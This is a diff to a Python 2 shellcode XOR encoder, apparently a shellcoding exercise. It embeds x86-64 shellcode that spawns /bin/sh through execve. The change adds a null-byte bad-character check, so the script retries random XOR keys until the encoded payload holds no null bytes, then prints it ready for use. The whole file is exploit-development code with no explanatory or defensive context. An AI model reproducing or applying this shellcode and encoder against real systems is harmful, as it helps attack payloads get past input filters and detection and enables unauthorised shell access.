@@ -4,15 +4,30 @@ from random import randint
 encoded = ""
 encoded2 = ""
 
-R = randint(0,2**8-1)
+bad_chars = [0x00]
 
 shellcode = ("\x90" + "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x54\x5e\x57\x54\x5a\x0f\x05")
 
-print "random generated number (key): 0x%02x" %R
-print
-for x in bytearray(shellcode):
-	# XOR Encoding 	
+def valid(byte):
+    for ch in bad_chars:
+        if ch == byte:
+            return False
+    return True
+
+valid_R = False
+while not valid_R:
+    R = randint(0,2**8-1)
+    print
+    print "random generated number (key): 0x%02x" %R
+    valid_R = True
+    for x in bytearray(shellcode):
+    	# XOR Encoding 	
 	y = x ^ R
+        if not valid(y):
+            valid_R = False
+            encoded = ""
+            encoded2 = ""
+            break
 	encoded += "\\x"
 	encoded += "%02x" %y
 	encoded2 += "0x"
